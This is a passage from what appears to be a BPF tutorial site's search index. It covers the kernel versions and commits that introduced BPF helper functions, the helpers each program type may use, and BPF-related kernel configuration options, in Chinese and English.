<code>BPF_FUNC_msg_push_data()</code> 4.20 <code>6fff607e2f14</code>\".<code>BPF_FUNC_msg_redirect_hash()</code> <code>BPF_FUNC_msg_redirect_map()</code> 4.17 <code>4f738adba30a</code> <code>BPF_FUNC_per_cpu_ptr()</code> 5.10 <code>eaa6bcb71ef6</code> <code>BPF_FUNC_perf_event_output()</code> 4.4 GPL <code>a43eec304259</code> <code>BPF_FUNC_perf_event_read()</code> 4.3 GPL <code>35578d798400</code> <code>BPF_FUNC_perf_event_read_value()</code> 4.15 GPL <code>908432ca84fc</code> <code>BPF_FUNC_perf_prog_read_value()</code> 4.15 GPL <code>4bebdc7a85aa</code> <code>BPF_FUNC_probe_read()</code> 4.1 GPL <code>2541517c32be</code> <code>BPF_FUNC_probe_read_kernel()</code> 5.5 GPL <code>6ae08ae3dea2</code> <code>BPF_FUNC_probe_read_kernel_str()</code> 5.5 GPL <code>6ae08ae3dea2</code> <code>BPF_FUNC_probe_read_user()</code> 5.5 GPL <code>6ae08ae3dea2</code> <code>BPF_FUNC_probe_read_user_str()</code> 5.5 GPL <code>6ae08ae3dea2</code> <code>BPF_FUNC_probe_read_str()</code> 4.11 GPL <code>a5e8c07059d0</code> <code>BPF_FUNC_probe_write_user()</code> 4.8 GPL <code>96ae52279594</code> ------------- ------- ------- ------------------------------------------------------------- BPF_FUNC_rc_keydown() 4.18 GPL f4364dcfc86d BPF_FUNC_rc_pointer_rel() 5.0 GPL 01d3240a04f4 BPF_FUNC_rc_repeat() 4.18 GPL f4364dcfc86d BPF_FUNC_read_branch_records() 5.6 GPL fff7b64355ea BPF_FUNC_redirect() 4.4 27b29f63058d BPF_FUNC_redirect_map() 4.14 97f91a7cf04f BPF_FUNC_redirect_neigh() 5.10 b4ab31414970 BPF_FUNC_redirect_peer() 5.10 9aa1206e8f48 BPF_FUNC_reserve_hdr_opt() 5.10 0813a841566f BPF_FUNC_ringbuf_discard() 5.8 457f44363a88 BPF_FUNC_ringbuf_discard_dynptr() 5.19 bc34dee65a65 BPF_FUNC_ringbuf_output() 5.8 457f44363a88 BPF_FUNC_ringbuf_query() 5.8 457f44363a88 BPF_FUNC_ringbuf_reserve() 5.8 457f44363a88 <code>BPF_FUNC_ringbuf_submit()</code> 5.8 <code>457f44363a88</code> <code>BPF_FUNC_ringbuf_submit_dynptr()</code> 5.19 <code>bc34dee65a65</code> <code>BPF_FUNC_send_signal()</code> 5.3 <code>8b401f9ed244</code> <code>BPF_FUNC_send_signal_thread()</code> 5.5 <code>8482941f0906</code> <code>BPF_FUNC_seq_printf()</code> 5.7 GPL <code>492e639f0c22</code> <code>BPF_FUNC_seq_printf_btf()</code> 5.10 <code>eb411377aed9</code> <code>BPF_FUNC_seq_write()</code> 5.7 GPL <code>492e639f0c22</code> <code>BPF_FUNC_set_hash()</code> 4.13 <code>ded092cd73c2</code> <code>BPF_FUNC_set_hash_invalid()</code> 4.9 <code>7a4b28c6cc9f</code> <code>BPF_FUNC_set_retval()</code> 5.18 <code>b44123b4a3dc</code> <code>BPF_FUNC_setsockopt()</code> 4.13 <code>8c4b4c7e9ff0</code> <code>BPF_FUNC_sk_ancestor_cgroup_id()</code> 5.7 <code>f307fa2cb4c9</code> <code>BPF_FUNC_sk_assign()</code> 5.6 <code>cf7fbe660f2d</code>\". <code>BPF_FUNC_sk_cgroup_id()</code> 5.7 <code>f307fa2cb4c9</code> <code>BPF_FUNC_sk_fullsock()</code> 5.1 <code>46f8bc92758c</code> <code>BPF_FUNC_sk_lookup_tcp()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_lookup_udp()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_redirect_hash()</code> 4.18 <code>81110384441a</code> <code>BPF_FUNC_sk_redirect_map()</code> 4.14 <code>174a79ff9515</code> <code>BPF_FUNC_sk_release()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_select_reuseport()</code> 4.19 <code>2dbb9b9e6df6</code> <code>BPF_FUNC_sk_storage_delete()</code> 5.2 <code>6ac99e8f23d4</code> <code>BPF_FUNC_sk_storage_get()</code> 5.2 <code>6ac99e8f23d4</code> <code>BPF_FUNC_skb_adjust_room()</code> 4.13 <code>2be7e212d541</code> <code>BPF_FUNC_skb_ancestor_cgroup_id()</code> 4.19 <code>7723628101aa</code> <code>BPF_FUNC_skb_change_head()</code> 4.10 <code>3a0af8fd61f9</code> <code>BPF_FUNC_skb_change_proto()</code> 4.8 <code>6578171a7ff0</code> <code>BPF_FUNC_skb_change_tail()</code> 4.9 <code>5293efe62df8</code> <code>BPF_FUNC_skb_change_type()</code> 4.8 <code>d2485c4242a8</code> <code>BPF_FUNC_skb_cgroup_classid()</code> 5.10 <code>b426ce83baa7</code> <code>BPF_FUNC_skb_cgroup_id()</code> 4.18 <code>cb20b08ead40</code> <code>BPF_FUNC_skb_ecn_set_ce()</code> 5.1 <code>f7c917ba11a6</code> <code>BPF_FUNC_skb_get_tunnel_key()</code> 4.3 <code>d3aa45ce6b94</code> <code>BPF_FUNC_skb_get_tunnel_opt()</code> 4.6 <code>14ca0751c96f</code> <code>BPF_FUNC_skb_get_xfrm_state()</code> 4.18 <code>12bed760a78d</code> <code>BPF_FUNC_skb_load_bytes()</code> 4.5 <code>05c74e5e53f6</code> <code>BPF_FUNC_skb_load_bytes_relative()</code> 4.18 <code>4e1ec56cdc59</code> <code>BPF_FUNC_skb_output()</code> 5.5 <code>a7658e1a4164</code> <code>BPF_FUNC_skb_pull_data()</code> 4.9 <code>36bbef52c7eb</code> <code>BPF_FUNC_skb_set_tstamp()</code> 5.18 <code>9bb984f28d5b</code> <code>BPF_FUNC_skb_set_tunnel_key()</code> 4.3 <code>d3aa45ce6b94</code> <code>BPF_FUNC_skb_set_tunnel_opt()</code> 4.6 <code>14ca0751c96f</code> <code>BPF_FUNC_skb_store_bytes()</code> 4.1 <code>91bc4822c3d6</code> <code>BPF_FUNC_skb_under_cgroup()</code> 4.8 <code>4a482f34afcc</code> <code>BPF_FUNC_skb_vlan_pop()</code> 4.3 <code>4e10df9a60d9</code> <code>BPF_FUNC_skb_vlan_push()</code> 4.3 <code>4e10df9a60d9</code> <code>BPF_FUNC_skc_lookup_tcp()</code> 5.2 <code>edbf8c01de5a</code> <code>BPF_FUNC_skc_to_mctcp_sock()</code> 5.19 <code>3bc253c2e652</code> <code>BPF_FUNC_skc_to_tcp_sock()</code> 5.9 <code>478cfbdf5f13</code> <code>BPF_FUNC_skc_to_tcp_request_sock()</code> 5.9 <code>478cfbdf5f13</code> <code>BPF_FUNC_skc_to_tcp_timewait_sock()</code> 5.9 <code>478cfbdf5f13</code> <code>BPF_FUNC_skc_to_tcp6_sock()</code> 5.9 <code>af7ec1383361</code> <code>BPF_FUNC_skc_to_udp6_sock()</code> 5.9 <code>0d4fad3e57df</code> <code>BPF_FUNC_skc_to_unix_sock()</code> 5.16 <code>9eeb3aa33ae0</code> <code>BPF_FUNC_snprintf()</code> 5.13 <code>7b15523a989b</code> <code>BPF_FUNC_snprintf_btf()</code> 5.10 <code>c4d0bfb45068</code> <code>BPF_FUNC_sock_from_file()</code> 5.11 <code>4f19cab76136</code> <code>BPF_FUNC_sock_hash_update()</code> 4.18 <code>81110384441a</code> <code>BPF_FUNC_sock_map_update()</code> 4.14 <code>174a79ff9515</code> <code>BPF_FUNC_spin_lock()</code> 5.1 <code>d83525ca62cf</code> <code>BPF_FUNC_spin_unlock()</code> 5.1 <code>d83525ca62cf</code> <code>BPF_FUNC_store_hdr_opt()</code> 5.10 <code>0813a841566f</code> <code>BPF_FUNC_strncmp()</code> 5.17 <code>c5fb19937455</code> <code>BPF_FUNC_strtol()</code> 5.2 <code>d7a4cb9b6705</code> <code>BPF_FUNC_strtoul()</code> 5.2 <code>d7a4cb9b6705</code> <code>BPF_FUNC_sys_bpf()</code> 5.14 <code>79a7f8bdb159</code> <code>BPF_FUNC_sys_close()</code> 5.14 <code>3abea089246f</code> <code>BPF_FUNC_sysctl_get_current_value()</code> 5.2 <code>1d11b3016cec</code> <code>BPF_FUNC_sysctl_get_name()</code> 5.2 <code>808649fb787d</code> <code>BPF_FUNC_sysctl_get_new_value()</code> 5.2 <code>4e63acdff864</code> <code>BPF_FUNC_sysctl_set_new_value()</code> 5.2 <code>4e63acdff864</code> <code>BPF_FUNC_tail_call()</code> 4.2 <code>04fd61ab36ec</code> <code>BPF_FUNC_task_pt_regs()</code> 5.15 GPL <code>dd6e10fbd9f</code> <code>BPF_FUNC_task_storage_delete()</code> 5.11 <code>4cf1bc1f1045</code> <code>BPF_FUNC_task_storage_get()</code> 5.11 <code>4cf1bc1f1045</code> <code>BPF_FUNC_tcp_check_syncookie()</code> 5.2 <code>399040847084</code> <code>BPF_FUNC_tcp_gen_syncookie()</code> 5.3 <code>70d66244317e</code> <code>BPF_FUNC_tcp_raw_check_syncookie_ipv4()</code> 6.0 <code>33bf9885040c</code> <code>BPF_FUNC_tcp_raw_check_syncookie_ipv6()</code> 6.0 <code>33bf9885040c</code> <code>BPF_FUNC_tcp_raw_gen_syncookie_ipv4()</code> 6.0 <code>33bf9885040c</code> <code>BPF_FUNC_tcp_raw_gen_syncookie_ipv6()</code> 6.0 <code>33bf9885040c</code> <code>BPF_FUNC_tcp_send_ack()</code> 5.5 <code>206057fe020a</code>\". <code>BPF_FUNC_tcp_sock()</code> 5.1 <code>655a51e536c0</code> <code>BPF_FUNC_this_cpu_ptr()</code> 5.10 <code>63d9b80dcf2c</code> <code>BPF_FUNC_timer_init()</code> 5.15 <code>b00628b1c7d5</code> <code>BPF_FUNC_timer_set_callback()</code> 5.15 <code>b00628b1c7d5</code> <code>BPF_FUNC_timer_start()</code> 5.15 <code>b00628b1c7d5</code> <code>BPF_FUNC_timer_cancel()</code> 5.15 <code>b00628b1c7d5</code> <code>BPF_FUNC_trace_printk()</code> 4.1 GPL <code>9c959c863f82</code> <code>BPF_FUNC_trace_vprintk()</code> 5.16 GPL <code>10aceb629e19</code> <code>BPF_FUNC_user_ringbuf_drain()</code> 6.1 <code>205715673844</code> <code>BPF_FUNC_xdp_adjust_head()</code> 4.10 <code>17bedab27231</code> <code>BPF_FUNC_xdp_adjust_meta()</code> 4.15 <code>de8f3a83b0a0</code> <code>BPF_FUNC_xdp_adjust_tail()</code> 4.18 <code>b32cc5b9a346</code> <code>BPF_FUNC_xdp_get_buff_len()</code> 5.18 <code>0165cc817075</code> <code>BPF_FUNC_xdp_load_bytes()</code> 5.18 <code>3f364222d032</code> <code>BPF_FUNC_xdp_store_bytes()</code> 5.18 <code>3f364222d032</code> <code>BPF_FUNC_xdp_output()</code> 5.6 GPL <code>d831ee84bfc9</code> <code>BPF_FUNC_override_return()</code> 4.16 GPL <code>9802d86585db</code> <code>BPF_FUNC_sock_ops_cb_flags_set()</code> 4.16 <code>b13d88072172</code> <p>Note: GPL-only BPF helpers require a GPL-compatible license. The current licenses considered GPL-compatible by the kernel are:</p> <ul> <li>GPL</li> <li>GPL v2</li> <li>GPL and additional rights</li> <li>Dual BSD/GPL</li> <li>Dual MIT/GPL</li> <li>Dual MPL/GPL</li> </ul> <p>Check the list of GPL-compatible licenses in your kernel source code.</p>"},{"location":"tutorials/bcc-documents/kernel-versions_en/#program-types_1","title":"Program Types","text":"<p>The list of program types and supported helper functions can be retrieved with:</p> <pre><code>git grep -W 'func_proto(enum bpf_func_id func_id' kernel/ net/ drivers/\n</code></pre> Program Type Helper Functions <code>BPF_PROG_TYPE_SOCKET_FILTER</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>BPF_FUNC_skb_load_bytes_relative()</code> <code>BPF_FUNC_get_socket_cookie()</code> <code>BPF_FUNC_get_socket_uid()</code> <code>BPF_FUNC_perf_event_output()</code> <code>Base functions</code> <code>BPF_PROG_TYPE_KPROBE</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_stackid()</code> <code>BPF_FUNC_get_stack()</code> <code>BPF_FUNC_perf_event_read_value()</code> <code>BPF_FUNC_override_return()</code> <code>Tracing functions</code> <code>BPF_PROG_TYPE_TRACEPOINT</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_stackid()</code> <code>BPF_FUNC_get_stack()</code> <code>BPF_FUNC_d_path()</code> <code>Tracing functions</code> <code>BPF_PROG_TYPE_XDP</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_smp_processor_id()</code> <code>BPF_FUNC_csum_diff()</code> <code>BPF_FUNC_xdp_adjust_head()</code> <code>BPF_FUNC_xdp_adjust_meta()</code> <code>BPF_FUNC_redirect()</code> <code>BPF_FUNC_redirect_map()</code> <code>BPF_FUNC_xdp_adjust_tail()</code> <code>BPF_FUNC_fib_lookup()</code> <code>Base functions</code> <code>BPF_PROG_TYPE_PERF_EVENT</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_stackid()</code> <code>BPF_FUNC_get_stack()</code> <code>BPF_FUNC_perf_prog_read_value()</code> <code>Tracing functions</code> <code>BPF_PROG_TYPE_CGROUP_SOCK</code> <code>BPF_FUNC_get_current_uid_gid()</code> <code>Base functions</code> <code>BPF_PROG_TYPE_LWT_IN</code> <code>BPF_FUNC_lwt_push_encap()</code> <code>LWT functions</code> <code>Base functions</code> <code>BPF_PROG_TYPE_LWT_OUT</code> <code>LWT functions</code> <code>Base functions</code> <code>BPF_PROG_TYPE_LWT_XMIT</code> <code>BPF_FUNC_skb_get_tunnel_key()</code> <code>BPF_FUNC_skb_set_tunnel_key()</code> <code>BPF_FUNC_skb_get_tunnel_opt()</code> <code>BPF_FUNC_skb_set_tunnel_opt()</code> <code>BPF_FUNC_redirect()</code> <code>BPF_FUNC_clone_redirect()</code> <code>BPF_FUNC_skb_change_tail()</code> <code>BPF_FUNC_skb_change_head()</code> <code>BPF_FUNC_skb_store_bytes()</code> <code>BPF_FUNC_csum_update()</code> <code>BPF_FUNC_l3_csum_replace()</code> <code>BPF_FUNC_l4_csum_replace()</code> <code>BPF_FUNC_set_hash_invalid()</code> <code>LWT functions</code> <code>BPF_PROG_TYPE_SOCK_OPS</code> <code>BPF_FUNC_setsockopt()</code> <code>BPF_FUNC_getsockopt()</code> <code>BPF_FUNC_sock_ops_cb_flags_set()</code> <code>BPF_FUNC_sock_map_update()</code> <code>BPF_FUNC_sock_hash_update()</code> <code>BPF_FUNC_get_socket_cookie()</code> <code>Base functions</code> <code>BPF_PROG_TYPE_SK_SKB</code> <code>BPF_FUNC_skb_store_bytes()</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>BPF_FUNC_skb_pull_data()</code> <code>BPF_FUNC_skb_change_tail()</code> <code>BPF_FUNC_skb_change_head()</code> <code>BPF_FUNC_get_socket_cookie()</code> <code>BPF_FUNC_get_socket_uid()</code> <code>BPF_FUNC_sk_redirect_map()</code> <code>BPF_FUNC_sk_redirect_hash()</code> <code>BPF_FUNC_sk_lookup_tcp()</code> <code>BPF_FUNC_sk_lookup_udp()</code> <code>BPF_FUNC_sk_release()</code> <code>Base functions</code> <code>BPF_PROG_TYPE_CGROUP_DEVICE</code> <code>BPF_FUNC_map_lookup_elem()</code> <code>BPF_FUNC_map_update_elem()</code> <code>BPF_FUNC_map_delete_elem()</code> <code>BPF_FUNC_get_current_uid_gid()</code> <code>BPF_FUNC_trace_printk()</code> <code>BPF_PROG_TYPE_RAW_TRACEPOINT</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_stackid()</code> <code>BPF_FUNC_get_stack()</code> <code>BPF_FUNC_skb_output()</code> <code>Tracing functions</code> <code>BPF_PROG_TYPE_CGROUP_SOCK_ADDR</code> <code>BPF_FUNC_get_current_uid_gid()</code> <code>BPF_FUNC_bind()</code> <code>BPF_FUNC_get_socket_cookie()</code> <code>Base functions</code> <code>BPF_PROG_TYPE_LWT_SEG6LOCAL</code> <code>BPF_FUNC_lwt_seg6_store_bytes()</code> <code>BPF_FUNC_lwt_seg6_action()</code> <code>BPF_FUNC_lwt_seg6_adjust_srh()</code> <code>LWT functions</code> <code>BPF_PROG_TYPE_LIRC_MODE2</code> <code>BPF_FUNC_rc_repeat()</code> <code>BPF_FUNC_rc_keydown()</code> <code>BPF_FUNC_rc_pointer_rel()</code> <code>BPF_FUNC_map_lookup_elem()</code> <code>BPF_FUNC_map_update_elem()</code> <code>BPF_FUNC_map_delete_elem()</code> <code>BPF_FUNC_ktime_get_ns()</code> <code>BPF_FUNC_tail_call()</code> <code>BPF_FUNC_get_prandom_u32()</code> <code>BPF_FUNC_trace_printk()</code> <code>BPF_PROG_TYPE_SK_REUSEPORT</code> <code>BPF_FUNC_sk_select_reuseport()</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>BPF_FUNC_load_bytes_relative()</code> <code>Base functions</code> <code>BPF_PROG_TYPE_FLOW_DISSECTOR</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>Base functions</code> Function Group Functions Base functions <code>BPF_FUNC_map_lookup_elem()</code> <code>BPF_FUNC_map_update_elem()</code> <code>BPF_FUNC_map_delete_elem()</code> <code>BPF_FUNC_map_peek_elem()</code> <code>BPF_FUNC_map_pop_elem()</code> <code>BPF_FUNC_map_push_elem()</code> <code>BPF_FUNC_get_prandom_u32()</code> <code>BPF_FUNC_get_smp_processor_id()</code> <code>BPF_FUNC_get_numa_node_id()</code> <code>BPF_FUNC_tail_call()</code> <code>BPF_FUNC_ktime_get_boot_ns()</code> <code>BPF_FUNC_ktime_get_ns()</code> <code>BPF_FUNC_trace_printk()</code> <code>BPF_FUNC_spin_lock()</code> <code>BPF_FUNC_spin_unlock()</code> <code>LWT functions</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>BPF_FUNC_skb_pull_data()</code> <code>BPF_FUNC_csum_diff()</code> <code>BPF_FUNC_get_cgroup_classid()</code> <code>BPF_FUNC_get_route_realm()</code> <code>BPF_FUNC_get_hash_recalc()</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_smp_processor_id()</code> <code>BPF_FUNC_skb_under_cgroup()</code> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/kernel_config/","title":"BPF \u7279\u6027\u7684\u5185\u6838\u914d\u7f6e","text":""},{"location":"tutorials/bcc-documents/kernel_config/#bpf_1","title":"\u4e0e BPF \u76f8\u5173\u7684\u5185\u6838\u914d\u7f6e","text":"\u529f\u80fd \u5185\u6838\u914d\u7f6e \u63cf\u8ff0 \u57fa\u7840 CONFIG_BPF_SYSCALL \u542f\u7528 bpf() \u7cfb\u7edf\u8c03\u7528 CONFIG_BPF_JIT BPF \u7a0b\u5e8f\u901a\u5e38\u7531 BPF \u89e3\u91ca\u5668\u5904\u7406\u3002\u6b64\u9009\u9879\u5141\u8bb8\u5185\u6838\u5728\u52a0\u8f7d\u7a0b\u5e8f\u65f6\u751f\u6210\u672c\u5730\u4ee3\u7801\u3002\u8fd9\u5c06\u663e\u8457\u52a0\u901f BPF \u7a0b\u5e8f\u7684\u5904\u7406 CONFIG_HAVE_BPF_JIT \u542f\u7528 BPF \u5373\u65f6\u7f16\u8bd1\u5668 CONFIG_HAVE_EBPF_JIT \u6269\u5c55 BPF JIT (eBPF) CONFIG_HAVE_CBPF_JIT \u7ecf\u5178 BPF JIT (cBPF) CONFIG_MODULES \u542f\u7528\u53ef\u52a0\u8f7d\u5185\u6838\u6a21\u5757\u7684\u6784\u5efa CONFIG_BPF BPF VM \u89e3\u91ca\u5668 CONFIG_BPF_EVENTS \u5141\u8bb8\u7528\u6237\u5c06 BPF \u7a0b\u5e8f\u9644\u52a0\u5230 kprobe\u3001uprobe \u548c tracepoint \u4e8b\u4ef6\u4e0a CONFIG_PERF_EVENTS \u5185\u6838\u6027\u80fd\u4e8b\u4ef6\u548c\u8ba1\u6570\u5668 CONFIG_HAVE_PERF_EVENTS \u542f\u7528\u6027\u80fd\u4e8b\u4ef6 CONFIG_PROFILING \u542f\u7528\u5206\u6790\u5668\u4f7f\u7528\u7684\u6269\u5c55\u5206\u6790\u652f\u6301\u673a\u5236 BTF CONFIG_DEBUG_INFO_BTF \u4ece DWARF \u8c03\u8bd5\u4fe1\u606f\u751f\u6210\u53bb\u91cd\u7684 BTF \u7c7b\u578b\u4fe1\u606f CONFIG_PAHOLE_HAS_SPLIT_BTF \u4e3a\u6bcf\u4e2a\u9009\u5b9a\u7684\u5185\u6838\u6a21\u5757\u751f\u6210 BTF CONFIG_DEBUG_INFO_BTF_MODULES \u4e3a\u5185\u6838\u6a21\u5757\u751f\u6210\u7d27\u51d1\u7684\u5206\u5272 BTF \u7c7b\u578b\u4fe1\u606f \u5b89\u5168 CONFIG_BPF_JIT_ALWAYS_ON \u542f\u7528 BPF JIT \u5e76\u5220\u9664 BPF \u89e3\u91ca\u5668\u4ee5\u907f\u514d\u731c\u6d4b\u6267\u884c CONFIG_BPF_UNPRIV_DEFAULT_OFF \u901a\u8fc7\u8bbe\u7f6e\u9ed8\u8ba4\u7981\u7528\u975e\u7279\u6743 BPF Cgroup CONFIG_CGROUP_BPF \u652f\u6301\u5c06 BPF \u7a0b\u5e8f\u9644\u52a0\u5230 cgroup \u4e0a \u7f51\u7edc CONFIG_BPFILTER \u57fa\u4e8e BPF \u7684\u6570\u636e\u5305\u8fc7\u6ee4\u6846\u67b6 (BPFILTER) CONFIG_BPFILTER_UMH \u4f7f\u7528\u5185\u5d4c\u7684\u7528\u6237\u6a21\u5f0f\u52a9\u624b\u6784\u5efa bpfilter \u5185\u6838\u6a21\u5757 CONFIG_NET_CLS_BPF \u57fa\u4e8e\u53ef\u7f16\u7a0b BPF (JIT'ed) \u8fc7\u6ee4\u5668\u8fdb\u884c\u6570\u636e\u5305\u5206\u7c7b\u7684\u57fa\u4e8e BPF \u7684\u5206\u7c7b\u5668\u7684\u66ff\u4ee3\u65b9\u6cd5 CONFIG_BPF_STREAM_PARSER \u542f\u7528\u6b64\u529f\u80fd\uff0c\u5141\u8bb8\u4f7f\u7528BPF_MAP_TYPE_SOCKMAP\u4e0eTCP\u6d41\u89e3\u6790\u5668\u914d\u5408\u4f7f\u7528 CONFIG_LWTUNNEL_BPF \u5728\u8def\u7531\u67e5\u627e\u5165\u7ad9\u548c\u51fa\u7ad9\u6570\u636e\u5305\u540e\uff0c\u5141\u8bb8\u4f5c\u4e3a\u4e0b\u4e00\u8df3\u64cd\u4f5c\u8fd0\u884cBPF\u7a0b\u5e8f CONFIG_NETFILTER_XT_MATCH_BPF BPF\u5339\u914d\u5c06\u5bf9\u6bcf\u4e2a\u6570\u636e\u5305\u5e94\u7528Linux\u5957\u63a5\u5b57\u8fc7\u6ee4\u5668\uff0c\u5e76\u63a5\u53d7\u8fc7\u6ee4\u5668\u8fd4\u56de\u975e\u96f6\u503c\u7684\u6570\u636e\u5305 CONFIG_IPV6_SEG6_BPF \u4e3a\u652f\u6301BPF seg6local\u6302\u94a9\uff0c\u6dfb\u52a0IPv6 Segement Routing\u52a9\u624b \u53c2\u8003 kprobes CONFIG_KPROBE_EVENTS \u5141\u8bb8\u7528\u6237\u901a\u8fc7ftrace\u63a5\u53e3\u52a8\u6001\u6dfb\u52a0\u8ddf\u8e2a\u4e8b\u4ef6\uff08\u7c7b\u4f3c\u4e8etracepoints\uff09 CONFIG_KPROBES \u542f\u7528\u57fa\u4e8ekprobes\u7684\u52a8\u6001\u4e8b\u4ef6 CONFIG_HAVE_KPROBES \u68c0\u67e5\u662f\u5426\u542f\u7528\u4e86kprobes CONFIG_HAVE_REGS_AND_STACK_ACCESS_API \u5982\u679c\u67b6\u6784\u652f\u6301\u4ecept_regs\u8bbf\u95ee\u5bc4\u5b58\u5668\u548c\u5806\u6808\u6761\u76ee\u6240\u9700\u7684API\uff0c\u5219\u5e94\u8be5\u9009\u62e9\u6b64\u7b26\u53f7\u3002\u4f8b\u5982\uff0c\u57fa\u4e8ekprobes\u7684\u4e8b\u4ef6\u8ddf\u8e2a\u5668\u9700\u8981\u6b64API CONFIG_KPROBES_ON_FTRACE \u5982\u679c\u67b6\u6784\u652f\u6301\u5c06pt_regs\u5b8c\u5168\u4f20\u9012\u7ed9\u51fd\u6570\u8ddf\u8e2a\uff0c\u5219\u5728\u51fd\u6570\u8ddf\u8e2a\u5668\u4e0a\u6709kprobes kprobe multi CONFIG_FPROBE \u542f\u7528fprobe\u4ee5\u4e00\u6b21\u6027\u5728\u591a\u4e2a\u51fd\u6570\u4e0a\u9644\u52a0\u63a2\u6d4b\u70b9 kprobe override CONFIG_BPF_KPROBE_OVERRIDE \u542f\u7528BPF\u7a0b\u5e8f\u8986\u76d6kprobed\u51fd\u6570 uprobes CONFIG_UPROBE_EVENTS \u542f\u7528\u57fa\u4e8euprobes\u7684\u52a8\u6001\u4e8b\u4ef6 CONFIG_ARCH_SUPPORTS_UPROBES \u67b6\u6784\u7279\u5b9a\u7684uprobes\u652f\u6301 CONFIG_UPROBES Uprobes\u662fkprobes\u7684\u7528\u6237\u7a7a\u95f4\u5bf9\u5e94\u9879\uff1a\u5b83\u4eec\u5141\u8bb8\u4eea\u5668\u5e94\u7528\u7a0b\u5e8f\uff08\u5982'perf probe'\uff09\u5728\u7528\u6237\u7a7a\u95f4\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u5e93\u4e2d\u5efa\u7acb\u975e\u4fb5\u5165\u6027\u63a2\u6d4b\u70b9\uff0c\u5e76\u5728\u7528\u6237\u7a7a\u95f4\u5e94\u7528\u7a0b\u5e8f\u89e6\u53d1\u63a2\u6d4b\u70b9\u65f6\u6267\u884c\u5904\u7406\u51fd\u6570\u3002 Tracepoints CONFIG_TRACEPOINTS \u542f\u7528\u5728\u5185\u6838\u4e2d\u63d2\u5165Tracepoints\u5e76\u4e0e\u95ee\u9898\u51fd\u6570\u8fde\u63a5 CONFIG_HAVE_SYSCALL_TRACEPOINTS \u542f\u7528\u7cfb\u7edf\u8c03\u7528\u8fdb\u5165/\u9000\u51fa\u8ddf\u8e2a Raw Tracepoints Same as Tracepoints LSM CONFIG_BPF_LSM \u4f7f\u7528BPF\u7a0b\u5e8f\u5bf9\u5b89\u5168\u94a9\u5b50\u8fdb\u884c\u4eea\u5668\u5316\uff0c\u5b9e\u73b0\u52a8\u6001MAC\u548c\u5ba1\u8ba1\u7b56\u7565 LIRC CONFIG_BPF_LIRC_MODE2 \u5141\u8bb8\u5c06BPF\u7a0b\u5e8f\u9644\u52a0\u5230lirc\u8bbe\u5907 <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/kernel_config_en/","title":"Kernel Configuration for BPF Features","text":""},{"location":"tutorials/bcc-documents/kernel_config_en/#bpf-related-kernel-configurations","title":"BPF Related Kernel Configurations","text":"Functionalities Kernel Configuration Description Basic CONFIG_BPF_SYSCALL Enable the bpf() system call CONFIG_BPF_JIT BPF programs are normally handled by a BPF interpreter. This option allows the kernel to generate native code when a program is loaded into the kernel. This will significantly speed-up processing of BPF programs CONFIG_HAVE_BPF_JIT Enable BPF Just In Time compiler CONFIG_HAVE_EBPF_JIT Extended BPF JIT (eBPF) CONFIG_HAVE_CBPF_JIT Classic BPF JIT (cBPF) CONFIG_MODULES Enable to build loadable kernel modules CONFIG_BPF BPF VM interpreter CONFIG_BPF_EVENTS Allow the user to attach BPF programs to kprobe, uprobe, and tracepoint events CONFIG_PERF_EVENTS Kernel performance events and counters CONFIG_HAVE_PERF_EVENTS Enable perf events CONFIG_PROFILING Enable the extended profiling support mechanisms used by profilers BTF CONFIG_DEBUG_INFO_BTF Generate deduplicated BTF type information from DWARF debug info CONFIG_PAHOLE_HAS_SPLIT_BTF Generate BTF for each selected kernel module CONFIG_DEBUG_INFO_BTF_MODULES Generate compact split BTF type information for kernel modules Security CONFIG_BPF_JIT_ALWAYS_ON Enable BPF JIT and removes BPF interpreter to avoid speculative execution CONFIG_BPF_UNPRIV_DEFAULT_OFF Disable unprivileged BPF by default by setting Cgroup CONFIG_CGROUP_BPF Support for BPF programs attached to cgroups Network CONFIG_BPFILTER BPF based packet filtering framework (BPFILTER) CONFIG_BPFILTER_UMH This builds bpfilter kernel module with embedded user mode helper CONFIG_NET_CLS_BPF BPF-based classifier - to classify packets based on programmable BPF (JIT'ed) filters as an alternative to ematches CONFIG_NET_ACT_BPF Execute BPF code on packets. The BPF code will decide if the packet should be dropped or not CONFIG_BPF_STREAM_PARSER Enable this to allow a TCP stream parser to be used with BPF_MAP_TYPE_SOCKMAP CONFIG_LWTUNNEL_BPF Allow to run BPF programs as a nexthop action following a route lookup for incoming and outgoing packets CONFIG_NETFILTER_XT_MATCH_BPF BPF matching applies a linux socket filter to each packet and accepts those for which the filter returns non-zero CONFIG_IPV6_SEG6_BPF To support  BPF seg6local hook. bpf: Add IPv6 Segment Routing helpersy. Reference kprobes CONFIG_KPROBE_EVENTS This allows the user to add tracing events (similar to tracepoints) on the fly via the ftrace interface CONFIG_KPROBES Enable kprobes-based dynamic events CONFIG_HAVE_KPROBES Check if krpobes enabled CONFIG_HAVE_REGS_AND_STACK_ACCESS_API This symbol should be selected by an architecture if it supports the API needed to access registers and stack entries from pt_regs. For example the kprobes-based event tracer needs this API. CONFIG_KPROBES_ON_FTRACE Have kprobes on function tracer if arch supports full passing of pt_regs to function tracing kprobe multi CONFIG_FPROBE Enable fprobe to attach the probe on multiple functions at once kprobe override CONFIG_BPF_KPROBE_OVERRIDE Enable BPF programs to override a kprobed function uprobes CONFIG_UPROBE_EVENTS Enable uprobes-based dynamic events CONFIG_ARCH_SUPPORTS_UPROBES Arch specific uprobes support CONFIG_UPROBES Uprobes is the user-space counterpart to kprobes: they enable instrumentation applications (such as 'perf probe') to establish unintrusive probes in user-space binaries and libraries, by executing handler functions when the probes are hit by user-space applications. 